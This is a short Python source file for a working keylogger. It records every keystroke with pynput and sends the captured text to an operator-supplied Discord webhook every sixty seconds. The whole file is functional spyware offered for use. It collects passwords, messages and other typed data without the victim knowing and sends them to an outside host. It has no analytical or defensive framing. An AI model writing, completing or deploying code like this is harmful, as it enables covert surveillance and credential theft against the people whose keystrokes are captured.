from pynput.keyboard import Listener
from threading import Timer
from dhooks import Webhook


WEBHOOK_URL = ""  # Put here your discord webhook url.
INTERVAL = 60  # You'll get the info every 60 seconds.


class Keylogger:
    def __init__(self, WB_URL, interval=60):
        self.WB_URL = WB_URL
        self.interval = interval
        self.log = ""

    def _send_info(self, log):
        if log != "":
            webhook = Webhook(self.WB_URL)
            webhook.send(log)

    def _key_down(self, key):
        key = str(key).replace("'", "")
        key = " " if key == "Key.space" else key
        key = "\n" if key == "Key.enter" else key

        if key == "Key.backspace":
            self.log = self.log[:len(self.log)-1]
            key = ""
            
        self.log += key

    def _report(self):
        self._send_info(self.log)
        self.log = ""
        Timer(self.interval, self._report).start()

    def run(self):
        self._report()
        with Listener(self._key_down) as c:
            c.join()


if __name__ == '__main__':
    Keylogger(WEBHOOK_URL, INTERVAL).run()